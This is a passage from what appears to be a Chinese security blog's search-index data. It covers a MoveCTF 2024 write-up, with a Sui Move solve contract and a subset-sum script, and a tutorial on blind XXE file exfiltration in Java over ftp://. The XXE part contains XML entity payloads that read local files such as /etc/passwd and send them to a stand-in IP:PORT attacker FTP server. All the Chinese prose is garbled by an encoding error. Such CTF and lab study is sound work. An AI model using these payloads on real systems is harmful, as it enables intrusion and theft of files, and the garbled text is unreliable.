Cook\u0026lt;Flour\u0026gt;, salt: Cook\u0026lt;Salt\u0026gt;, } struct Cook\u0026lt;T\u0026gt; has copy, drop, store { source: vector\u0026lt;T\u0026gt; } Pizzaä¸­çš„olive_oilså®é™…ä¸Šæ˜¯ä¸€ä¸ª16ä½æ•´æ•°çš„æ•°ç»„ï¼Œå¤–é¢å¥—äº†ä¸¤å±‚ç»“æ„ä½“ã€‚ç”±äºbcsçš„åºåˆ—åŒ–æ ¼å¼ï¼ŒPizzaçš„åºåˆ—åŒ–æ•°æ®ä¸ºï¼š\næ•°ç»„é•¿åº¦ æ•°æ® æ•°ç»„é•¿åº¦ æ•°æ® \u0026hellip;. 0x4 0x1 0x2 0x3 0x4 0x3 0x1 0x2 0x3 \u0026hellip;. ä½¿ç”¨ä»¥ä¸‹pythonè„šæœ¬è§£æï¼š\ndata = \u0026#39;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026#39; i = 0 bytes_s = [] while i \u0026lt; len(data) - 1: bytes_s.append(int(\u0026#39;0x\u0026#39; + data[i] + data[i+1],16)) i = i+ 2 res = [] i = 0 p = 0 while i \u0026lt; len(bytes_s): p = bytes_s[i] i = i + 1 l = [] for o in range(p): l.append(\u0026#39;0x\u0026#39; + hex(bytes_s[i+1]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;) + hex(bytes_s[i]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;)) i = i + 2 res.append(l) print(res) å¯èƒ½æ˜¯å› ä¸ºåç è¡¥ç é‚£ä¸€å¥—ä¸œè¥¿ï¼Œæˆ‘å‘ç°2å­—èŠ‚çš„æ•°å­—ï¼ˆ16ä½ï¼‰éœ€è¦å€’æ¢ä¸€ä¸‹æ‰è¡Œã€‚ é€šè¿‡å¾—åˆ°çš„æ•°æ®ç”Ÿæˆå¯¹è±¡å³å¯ã€‚\nrecookå‡½æ•°ï¼š recookå‡½æ•°å°±ç®€å•è®¸å¤šäº†ã€‚ å·²ç»æŠŠæ•°æ®éƒ½å†™å‡ºæ¥äº†ï¼Œç›´æ¥ç”Ÿæˆåºåˆ—åŒ–æ•°æ®ä¼ å‚å³å¯ã€‚\næ”»å‡»åˆçº¦ module zoiltin_solve_kitchen::exp{ use sui::tx_context::{TxContext}; use sui::bcs; use sui::event; use std::vector; use kitchen::kitchen::{Self,Olive_oil,Yeast,Flour,Salt}; struct Poil has drop{ p1:vector\u0026lt;u16\u0026gt;, p2:vector\u0026lt;u16\u0026gt;, p3:vector\u0026lt;u16\u0026gt;, p4:vector\u0026lt;u16\u0026gt; } struct Message has drop,copy{ mass:vector\u0026lt;u8\u0026gt; } public entry fun exp(ctx: \u0026amp;mut TxContext) { let obj1 = Poil{ p1:vector\u0026lt;u16\u0026gt;[0xa515,0xa6b8,0xc9f8,0xbb46], p2:vector\u0026lt;u16\u0026gt;[0xbd00,0x999d,0xb77e], p3:vector\u0026lt;u16\u0026gt;[0xd78a,0xfa84,0xb8f2], p4:vector\u0026lt;u16\u0026gt;[0xf1c5,0xe122] }; // cookéœ€è¦çš„ç›¸åº”æ•°æ®ã€‚ let statu = kitchen::get_status(ctx); let l1 = 4; let l2 = 3; let l3 = 3; let l4 = 2; let cook1 = vector::empty\u0026lt;Olive_oil\u0026gt;(); let cook2 = vector::empty\u0026lt;Yeast\u0026gt;(); let cook3 = vector::empty\u0026lt;Flour\u0026gt;(); let cook4 = vector::empty\u0026lt;Salt\u0026gt;(); // é€šè¿‡æ•°æ®ç”Ÿæˆæ‰€éœ€çš„å¯¹è±¡ã€‚ let i = 0; while(i \u0026lt; l1) { vector::push_back(\u0026amp;mut cook1, kitchen::get_Olive_oil((*vector::borrow(\u0026amp;obj1.p1, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l2) { vector::push_back(\u0026amp;mut cook2, kitchen::get_Yeast((*vector::borrow(\u0026amp;obj1.p2, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l3) { vector::push_back(\u0026amp;mut cook3, kitchen::get_Flour((*vector::borrow(\u0026amp;obj1.p3, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l4) { vector::push_back(\u0026amp;mut cook4, kitchen::get_Salt((*vector::borrow(\u0026amp;obj1.p4, i) as u16))); i = i + 1; }; // event::emit( Message{ // mass: bcs::to_bytes(\u0026amp;obj1) // } ); // assert!( bcs::to_bytes(\u0026amp;obj1) == x\u0026#34;04a515a6b8c9f8bb4603bd00999db77e03d78afa84b8f202f1c5e122\u0026#34;, 999); kitchen::cook(cook1,cook2,cook3,cook4,\u0026amp;mut statu); let obj2 = Poil{ p1:vector\u0026lt;u16\u0026gt;[ 0xb9d9, 0xeb54, 0x9268, 0xc5f7, 0xa1ec, 0xd084 ], p2:vector\u0026lt;u16\u0026gt;[ 0xbd00, 0xfc81, 0x999d, 0xb77e ], p3:vector\u0026lt;u16\u0026gt;[ 0xdcc7, 0xcc7a, 0x8f19, 0x96b1, 0x8a6d ], p4:vector\u0026lt;u16\u0026gt;[ 0x8b01, 0xf1c5, 0xc6ec ] }; // è¿™é‡Œé€šè¿‡è‡ªå®šä¹‰çš„Poilç»“æ„ç”Ÿæˆåºåˆ—åŒ–å­—èŠ‚ï¼Œå› ä¸ºbcsç‰¹ç‚¹ï¼Œåªè¦ä»–ä»¬åœ¨å†…å­˜ä¸­å­˜å‚¨æ ¼å¼ä¸€æ ·ï¼Œæ— è®ºç»“æ„ä½“åæˆ–åµŒå¥—äº†å‡ å±‚éƒ½æ— æ‰€è°“ã€‚æœ€åç”Ÿæˆçš„åºåˆ—åŒ–å­—èŠ‚éƒ½æ˜¯ä¸€æ ·çš„ã€‚ kitchen::recook(bcs::to_bytes(\u0026amp;obj2),\u0026amp;mut statu); kitchen::get_flag(\u0026amp;statu,ctx); } } ç½‘ä¸Šå…³äºbcsçš„èµ„æ–™å¾ˆå°‘ï¼Œæœåˆ°çš„bcsçš„ç¬¬ä¸‰æ–¹è§£æåº“ä¹Ÿéƒ½ä¸èƒ½æˆåŠŸè§£æï¼Œä¸è¿‡è¿˜å¥½é¢˜ç›®çš„æ•°æ®ä¸ç®—å¤æ‚ï¼Œè‡ªå·±å†™çš„è„šæœ¬ä¹Ÿèƒ½ç”¨ã€‚\nsubset sorce: 400 (æœªè§£å†³)\né¢˜ç›®æºç ï¼š\nmodule subset::subset_sum { use sui::event; use sui::tx_context; use std::vector; struct Flag has copy, drop { user: address } struct Status has store, drop { status1: bool, status2: bool, status3: bool, user: address } const SUBSET1: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[1, 2, 3, 4, 5]; const SUBSET1_k: u256 = 3; const SUBSET1_SUM: u256 = 10; const SUBSET2: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[657114161599166, 910496114410022, 688072175280628, 979125688929861, 785338725553848, 887159728265050, 622841641193103, 725154659875148, 740423950361799, 1112663190822550, 922195312967936, 1042436852643560, 794233930466363, 1005209504277475, 1095553790921575, 1100234031975913, 1097338706315892, 685173186787942, 931084447948631, 1025208692464347, 823246835986875, 640705587553065, 1067772094848338, 608307547370178, 860527574463312, 745522896700102, 1107646656429468, 575719789023353, 1008988042757401, 563072788255737, 882855688862943, 974319745991702, 1004427379286462, 904504413493231, 1083652042079152, 1053694822809090, 702717128907262, 881540236795119, 992204188883575, 890965906483327]; const SUBSET2_k: u256 = 5; const SUBSET2_SUM: u256 = 4178919802453692; const SUBSET3: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[730983191275949878802706287425, 738747747182330870358722868390, 680758618870742741205069880873, 736839950200009681117675478653, 821817898783913524938769447793, 1062662929594640521216588473346, 804078432654564652353003934418, 987354119502628442223858924307, 974121064863569224403070119631, 766517359152261667697388282513, 1115664590742545309936719501477, 1254953696369781959586392455121, 708965201854329468418120106125, 803407590419087414384275360152, 680994772249007776444211943134, 1209641410992728376967530103489, 1022807828605992586908433214193, 708760513774702586605766399361, 1146510154260900723919247238072, 1071639493717448858831225830703, 704595551001390485227577881300, 666267842956106233584633761922, 916484600070887410197321230180, 869547011380359879465486127051, 1146284238922586539801525899580, 960791406315307372223215677265, 846714517434965788941098273736, 943109174072029103168835446476, 1186748483275224241752870865835, 810729587696497173434925395865, 1081140748486010470135469081647, 1117896979087650487375387404086, 815335940196924955981808193550, 980088874723074134145795909695, 1040350471929604504671667297293, 694306413856033832104987821225, 1100701148915109260220219397362, 861206885233154419043148976517, 876554683816312162465230697586, 1076923686440478606439365136720, 1107602068170190810465822909560, 1100902219684950305811682891430, 1009332208289062882998661101012, 967609782575367058780528699819, 847083579140405861838133952519, 960959937086001625649028920079, 705904760596273528708773247739, 988488072940508411593301577206, 855813607361058850034718734435, 923433147009426548286155351544, 927267999331166226154541562801, 833421857490492247367663980146, 913726313126985248790906682414, 1152739002690744639089937932044, 758241923243582267541395815418, 826183630101084916296521382931, 871183653161711616458012031543, 1118876419859306653014740242503, 925209067093127804911661688602, 796047972746266882548343051358, 1105317347573296959936900839504, 1032520332923337088078820581073, 790503191621237284611596729403, 1093888060891270134787133219999, 1129244151204837429536515955111, 736340764546413369555890340882, 844331877762673816004189096610, 1216403448409604941009786692773, 1026707098397380044704009977063, 1162146257113640418035057534747, 1239108677717284719224289951413, 1179642728157883101738427519029, 1121726694197132350252978011382, 1166236995314127503915531123371, 1237380820841327126465021125310, 928563984604088646801945637827, 969172329973162874760566309613, 916791337778690807774047076043, 1187392146940862931565053344747, 1041354841046252194695344517944]; const SUBSET3_k: u256 = 10; const SUBSET3_SUM: u256 = 9639405868465735216305592265916; public fun get_status(ctx: \u0026amp;mut tx_context::TxContext): Status { Status { status1: false, status2: false, status3: false, user: tx_context::sender(ctx) } } public fun check_params(vec: vector\u0026lt;u256\u0026gt;, k: u256) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;vec)) { assert!(*vector::borrow(\u0026amp;vec, i) == 1 || *vector::borrow(\u0026amp;vec, i) == 0, 0); sum = sum + *vector::borrow(\u0026amp;vec, i); i = i + 1; }; assert!(sum == k, 0); } public fun solve_subset1(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET1)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET1, i)); i = i + 1; }; assert!(SUBSET1_SUM == sum, 0); check_params(vec, SUBSET1_k); status.status1 = true; } public fun solve_subset2(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET2)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET2, i)); i = i + 1; }; assert!(SUBSET2_SUM == sum, 0); check_params(vec, SUBSET2_k); status.status2 = true; } public fun solve_subset3(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET3)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET3, i)); i = i + 1; }; assert!(SUBSET3_SUM == sum, 0); check_params(vec, SUBSET3_k); status.status3 = true; } public fun get_flag(status: \u0026amp;Status, ctx: \u0026amp;mut tx_context::TxContext) { let user = tx_context::sender(ctx); assert!(status.user == user, 0); assert!(status.status1 \u0026amp;\u0026amp; status.status2 \u0026amp;\u0026amp; status.status3, 0); event::emit(Flag { user: user }); } } ä»subsetä¸­æ‰¾åˆ°ä¸€ä¸ªé•¿åº¦ä¸ºsubset_kçš„å­é›†ï¼Œå…¶å…ƒç´ ä¹‹å’Œç­‰äºsubset_sumã€‚ æœ‰ä¸‰ä¸ªå­é—®é¢˜ï¼šsolve_subset1ï¼Œsolve_subset2å’Œsolve_subset3ã€‚ è¯·æ•™reå¤§ä½¬åæ‹¿åˆ°çš„è„šæœ¬ï¼š\ndef find_subset_sum(subset, subset_k, subset_sum): # å¯¼å…¥å¿…è¦çš„åº“ from itertools import combinations # éå†subsetä¸­æ‰€æœ‰å¯èƒ½çš„kå…ƒç»„åˆ for combination in combinations(subset, subset_k): # å¦‚æœç»„åˆçš„å…ƒç´ ä¹‹å’Œç­‰äºsubset_sumï¼Œåˆ™è¿”å›ç»„åˆ if sum(combination) == subset_sum: return combination # å¦‚æœæ‰¾ä¸åˆ°æ»¡è¶³æ¡ä»¶çš„ç»„åˆï¼Œåˆ™è¿”å›None return None # å®šä¹‰è¾“å…¥ subset = [1,2,3,4,5] subset_k = 3 subset_sum = 10 # è°ƒç”¨å‡½æ•°æŸ¥æ‰¾æ»¡è¶³æ¡ä»¶çš„ç»„åˆ result = find_subset_sum(subset, subset_k, subset_sum) # æ‰“å°ç»“æœ if result: print(\u0026#34;æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ç»„åˆ:\u0026#34;) print(result) else: print(\u0026#34;æ‰¾ä¸åˆ°æ»¡è¶³æ¡ä»¶çš„ç»„åˆ\u0026#34;) ç¬¬ä¸€ç»„ï¼š(1, 4, 5) ç¬¬äºŒç»„ï¼š(725154659875148, 685173186787942, 1025208692464347, 860527574463312, 882855688862943) ç¬¬ä¸‰ç»„è·‘ä¸å‡ºæ¥å•¦~~~~~~~~~~~\nå‚è€ƒ https://intro-zh.sui-book.com/ https://docs.sui.io/concepts/sui-move-concepts\n","permalink":"https://zoiltin.github.io/posts/movectf-2024-wp/","summary":"Checkin sorce:100\né¢˜ç›®æºç :\nmodule movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; const ESTRING:u64 = 0; struct Flag has copy, drop { sender: address, flag: bool, } public entry fun get_flag(string: vector\u0026lt;u8\u0026gt;, ctx: \u0026amp;mut TxContext) { assert!(string == b\u0026#34;MoveBitCTF\u0026#34;,ESTRING); event::emit(Flag { sender: tx_context::sender(ctx), flag: true, }); } } å¸¦ç€MoveBitCTFå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°è°ƒç”¨get_flagå‡½æ•°ã€‚ä¼ å‚è¦ç”¨å­—èŠ‚ã€‚\n# è½¬æ¢ä¸ºåå…­è¿›åˆ¶ print(\u0026#34;0x\u0026#34;) for i in \u0026#34;MoveBitCTF\u0026#34;: print(hex(ord(i)).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;),end=\u0026#34;\u0026#34;) è°ƒç”¨å³å¯ï¼š\nsui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200","title":"movectf_2024_wp"},{"content":"æœ¬ç¯‡æ–‡ç« ä»…ç”¨äºæŠ€æœ¯äº¤æµå­¦ä¹ å’Œç ”ç©¶çš„ç›®çš„ï¼Œä¸¥ç¦ä½¿ç”¨æ–‡ç« ä¸­çš„æŠ€æœ¯ç”¨äºéæ³•ç›®çš„å’Œç ´åã€‚\nå…³äºç›²XXEçš„æ–‡ä»¶è¯»å– ç›²XXEæƒ³è¦è¯»å–æ–‡ä»¶ä¸€èˆ¬æ¥è¯´éœ€è¦å¤–å¸¦ã€‚ä½†æ˜¯å¦‚æœæ–‡ä»¶ä¸­åŒ…å«æ¢è¡Œç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œç›´æ¥httpå¤–å¸¦ï¼Œä¼šæŠ¥æ— æ•ˆurlé”™è¯¯ã€‚ åœ¨phpç¯å¢ƒä¸‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨phpä¼ªåè®®ä¸­çš„filterè¿›è¡Œç¼–ç è½¬æ¢ï¼Œå°±ä¸ä¼šæŠ¥é”™äº†ã€‚ ä½†åœ¨javaç¯å¢ƒä¸‹æˆ–è€…ç¦ç”¨filterçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•ç”¨ftp://åè®®å¤–å¸¦ã€‚\nç¯å¢ƒ è¿™é‡Œä½¿ç”¨çš„ç¯å¢ƒæ˜¯Hello-Java-Secçš„é¶åœºç¯å¢ƒ https://github.com/j3ers3/Hello-Java-Sec/\njdk8 æ¼æ´ä»£ç ï¼š DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // è¿™é‡Œå…¶å®æœ‰å›æ˜¾ï¼Œå·æ‡’ä¸æ”¹ä»£ç äº†ï¼Œå‡è£…çœ‹ä¸è§ã€‚ åŸç† ä½¿ç”¨ftp://åè®®å¯ä»¥å¸¦å‡ºå¸¦æœ‰æ¢è¡Œçš„æ•°æ®ã€‚ ï¼ˆå¯åˆ©ç”¨ç‰ˆæœ¬ï¼šjdk\u0026lt;7u141å’Œjdk\u0026lt;8u162ï¼Œé«˜äºè¿™ä¸¤ä¸ªç‰ˆæœ¬ftp://åè®®ä¹Ÿä¸èƒ½ç”¨äº†ã€‚ï¼‰\næ­£å¸¸çš„ftpæœåŠ¡å™¨ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€è¦ï¼Œä½†æˆ‘ä»ç½‘ä¸Šæ‰¾åˆ°çš„æ¨¡æ‹ŸftpæœåŠ¡å™¨éƒ½ä¸èƒ½ç”¨ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘ä¸ä¼šç”¨ï¼‰ï¼Œäºæ˜¯å°±è‡ªå·±å†™äº†ä¸€ä¸ªã€‚ é“¾æ¥ï¼šhttps://github.com/zoiltin/fake-ftp-server\nå†™è„šæœ¬ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹è°ƒç”¨ftp://åè®®æ˜¯å‘ç”Ÿäº†ä»€ä¹ˆã€‚é€šè¿‡è¯»å–/etc/passwdä¸ºä¾‹ï¼Œpayloadï¼šftp://ip:port/{data}æ•°æ®äº¤äº’å¦‚ä¸‹ï¼š è“è‰²çš„ä¸ºfake-ftp-serverã€‚ å»ºç«‹è¿æ¥å’Œç¡®å®šæ¨¡å¼åï¼ŒæœåŠ¡å™¨å¼€å§‹å‘é€CWDæŒ‡ä»¤ï¼Œå› ä¸ºåœ¨/etc/passwdä¸­æœ‰è®¸å¤š/å°†æ•°æ®åˆ†å‰²ä¸ºè®¸å¤šç›®å½•ï¼Œæ‰€ä»¥æœåŠ¡å™¨ä¸€ç›´å°è¯•åˆ‡æ¢ç›®å½•ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯æ¥å—å¹¶ä¸æ–­è¿”å›250 Directory successfully changed.è®©æœåŠ¡å™¨ä¸€ç›´ä¼ æ•°æ®ã€‚ åœ¨æœ€åä¸€ä¸ª/åçš„æ•°æ®ï¼ŒæœåŠ¡å™¨å°†å…¶è§†ä¸ºè¦ä¸‹è½½çš„æ–‡ä»¶åï¼Œè¯·æ±‚ç”¨è¢«åŠ¨æ¨¡å¼ä¸‹è½½æ•°æ®ï¼Œä»æµé‡ä¸­å¯è§ï¼Œæ”»å‡»è€…å¼€å¯63568ç«¯å£å¹¶å‘Šè¯‰æœåŠ¡å™¨ï¼Œå½“æœåŠ¡å™¨è¿æ¥63568ç«¯å£åï¼Œå³å‘æˆ‘ä»¬å‘é€äº†è¦ä¸‹è½½çš„æ–‡ä»¶åä¹Ÿå°±æ˜¯æœ€åä¸€æ®µæ•°æ®ã€‚\nftp://åè®®æ¯”è¾ƒç®€å•ï¼Œè„šæœ¬å¾ˆå®¹æ˜“å®ç°ã€‚\nç”¨æ³• payload:\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file://\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;ftp://IP:PORT/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; ç®€å•çš„ç”¨æ³•ï¼š ftp://IP:PORT/%file; æˆ–è€…å…¨ç”¨CWDè¯»å–ï¼š ftp://IP:PORT/%file;/ æ•°æ®ä¸­ä¸èƒ½åŒ…å«%å’Œ#ï¼Œå¦‚æœæœ‰'æˆ–\u0026quot;éœ€è¦è°ƒæ•´evil.dtdä¸­åŒ…è£¹ftp://çš„å¼•å·ç±»å‹ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚?å’Œ#ä¼šå¯¼è‡´æ•°æ®æˆªæ–­ã€‚\nåœ¨é«˜ç‰ˆæœ¬ä¹Ÿå¯ä»¥ååˆ†æœ‰é™çš„åˆ©ç”¨ï¼š\nftp://username:%file;@IP:PORT/asdasd å°†æ•°æ®ä»å¯†ç å¤„ä¼ é€’ï¼Œåªèƒ½è¯»ä¸€è¡Œ å¦‚æœæ–‡ä»¶æœ‰å¤šè¡Œä¼šæŠ¥é”™ï¼Œå›æ˜¾ä¸€éƒ¨åˆ†ã€‚ ","permalink":"https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/","summary":"æœ¬ç¯‡æ–‡ç« ä»…ç”¨äºæŠ€æœ¯äº¤æµå­¦ä¹ å’Œç ”ç©¶çš„ç›®çš„ï¼Œä¸¥ç¦ä½¿ç”¨æ–‡ç« ä¸­çš„æŠ€æœ¯ç”¨äºéæ³•ç›®çš„å’Œç ´åã€‚\nå…³äºç›²XXEçš„æ–‡ä»¶è¯»å– ç›²XXEæƒ³è¦è¯»å–æ–‡ä»¶ä¸€èˆ¬æ¥è¯´éœ€è¦å¤–å¸¦ã€‚ä½†æ˜¯å¦‚æœæ–‡ä»¶ä¸­åŒ…å«æ¢è¡Œç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œç›´æ¥httpå¤–å¸¦ï¼Œä¼šæŠ¥æ— æ•ˆurlé”™è¯¯ã€‚ åœ¨phpç¯å¢ƒä¸‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨phpä¼ªåè®®ä¸­çš„filterè¿›è¡Œç¼–ç è½¬æ¢ï¼Œå°±ä¸ä¼šæŠ¥é”™äº†ã€‚ ä½†åœ¨javaç¯å¢ƒä¸‹æˆ–è€…ç¦ç”¨filterçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•ç”¨ftp://åè®®å¤–å¸¦ã€‚\nç¯å¢ƒ è¿™é‡Œä½¿ç”¨çš„ç¯å¢ƒæ˜¯Hello-Java-Secçš„é¶åœºç¯å¢ƒ https://github.com/j3ers3/Hello-Java-Sec/\njdk8 æ¼æ´ä»£ç ï¼š DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // è¿™é‡Œå…¶å®æœ‰å›æ˜¾ï¼Œå·æ‡’ä¸æ”¹ä»£ç äº†ï¼Œå‡è£…çœ‹ä¸è§ã€‚ åŸç† ä½¿ç”¨ftp://åè®®å¯ä»¥å¸¦å‡ºå¸¦æœ‰æ¢è¡Œçš„æ•°æ®ã€‚ ï¼ˆå¯åˆ©ç”¨ç‰ˆæœ¬ï¼šjdk\u0026lt;7u141å’Œjdk\u0026lt;8u162ï¼Œé«˜äºè¿™ä¸¤ä¸ªç‰ˆæœ¬ftp://åè®®ä¹Ÿä¸èƒ½ç”¨äº†ã€‚ï¼‰\næ­£å¸¸çš„ftpæœåŠ¡å™¨ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€è¦ï¼Œä½†æˆ‘ä»ç½‘ä¸Šæ‰¾åˆ°çš„æ¨¡æ‹ŸftpæœåŠ¡å™¨éƒ½ä¸èƒ½ç”¨ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘ä¸ä¼šç”¨ï¼‰ï¼Œäºæ˜¯å°±è‡ªå·±å†™äº†ä¸€ä¸ªã€‚ é“¾æ¥ï¼šhttps://github.com/zoiltin/fake-ftp-server\nå†™è„šæœ¬ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹è°ƒç”¨ftp://åè®®æ˜¯å‘ç”Ÿäº†ä»€ä¹ˆã€‚é€šè¿‡è¯»å–/etc/passwdä¸ºä¾‹ï¼Œpayloadï¼šftp://ip:port/{data}æ•°æ®äº¤äº’å¦‚ä¸‹ï¼š è“è‰²çš„ä¸ºfake-ftp-serverã€‚ å»ºç«‹è¿æ¥å’Œç¡®å®šæ¨¡å¼åï¼ŒæœåŠ¡å™¨å¼€å§‹å‘é€CWDæŒ‡ä»¤ï¼Œå› ä¸ºåœ¨/etc/passwdä¸­æœ‰è®¸å¤š/å°†æ•°æ®åˆ†å‰²ä¸ºè®¸å¤šç›®å½•ï¼Œæ‰€ä»¥æœåŠ¡å™¨ä¸€ç›´å°è¯•åˆ‡æ¢ç›®å½•ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯æ¥å—å¹¶ä¸æ–­è¿”å›250 Directory successfully changed.è®©æœåŠ¡å™¨ä¸€ç›´ä¼ æ•°æ®ã€‚ åœ¨æœ€åä¸€ä¸ª/åçš„æ•°æ®ï¼ŒæœåŠ¡å™¨å°†å…¶è§†ä¸ºè¦ä¸‹è½½çš„æ–‡ä»¶åï¼Œè¯·æ±‚ç”¨è¢«åŠ¨æ¨¡å¼ä¸‹è½½æ•°æ®ï¼Œä»æµé‡ä¸­å¯è§ï¼Œæ”»å‡»è€…å¼€å¯63568ç«¯å£å¹¶å‘Šè¯‰æœåŠ¡å™¨ï¼Œå½“æœåŠ¡å™¨è¿æ¥63568ç«¯å£åï¼Œå³å‘æˆ‘ä»¬å‘é€äº†è¦ä¸‹è½½çš„æ–‡ä»¶åä¹Ÿå°±æ˜¯æœ€åä¸€æ®µæ•°æ®ã€‚\nftp://åè®®æ¯”è¾ƒç®€å•ï¼Œè„šæœ¬å¾ˆå®¹æ˜“å®ç°ã€‚\nç”¨æ³• payload:\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file://\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;ftp://IP:PORT/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; ç®€å•çš„ç”¨æ³•ï¼š ftp://IP:PORT/%file; æˆ–è€…å…¨ç”¨CWDè¯»å–ï¼š ftp://IP:PORT/%file;/ æ•°æ®ä¸­ä¸èƒ½åŒ…å«%å’Œ#ï¼Œå¦‚æœæœ‰'æˆ–\u0026quot;éœ€è¦è°ƒæ•´evil.dtdä¸­åŒ…è£¹ftp://çš„å¼•å·ç±»å‹ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚?å’Œ#ä¼šå¯¼è‡´æ•°æ®æˆªæ–­ã€‚\nåœ¨é«˜ç‰ˆæœ¬ä¹Ÿå¯ä»¥ååˆ†æœ‰é™çš„åˆ©ç”¨ï¼š\nftp://username:%file;@IP:PORT/asdasd å°†æ•°æ®ä»å¯†ç å¤„ä¼ é€’ï¼Œåªèƒ½è¯»ä¸€è¡Œ å¦‚æœæ–‡ä»¶æœ‰å¤šè¡Œä¼šæŠ¥é”™ï¼Œå›æ˜¾ä¸€éƒ¨åˆ†ã€‚ ","title":"ç›²XXEä¸­FTPåè®®çš„åˆ©ç”¨"}]